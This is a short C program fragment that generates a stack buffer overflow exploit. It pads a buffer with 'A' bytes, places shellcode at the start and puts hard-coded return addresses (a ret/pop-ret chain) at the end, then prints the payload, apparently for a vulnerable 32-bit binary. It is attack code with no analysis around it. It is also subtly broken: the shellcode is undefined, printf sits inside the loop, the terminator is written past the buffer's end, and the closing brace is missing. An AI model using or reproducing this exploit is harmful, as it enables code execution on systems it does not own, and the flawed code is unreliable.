#define POPRET 0x08048467
#define RET 0x08048468
#define bufsize 264
#define chainsize 4
int main(void) {
	char *buff, *ptr;
	long *adrptr;
	int i;
	buff = malloc(bufsize);
	for (i = 0; i < bufsize; i++)
		buff[i] = 'A';
	ptr = buff + bufsize - chainsize;
	adrptr = (long*)ptr;
	for (i = bufsize - chainsize; i < bufsize; i += 4)
		if (i == bufsize - 4) * (adrptr++) = POPRET;
		else *(adrptr++) = RET;
	ptr = buff;
	for (i = 0; i < strlen(shellcode); i++) {
		*(ptr++) = shellcode[i];
		buff[bufsize] = 'n0';
		printf("%s", buff);
	}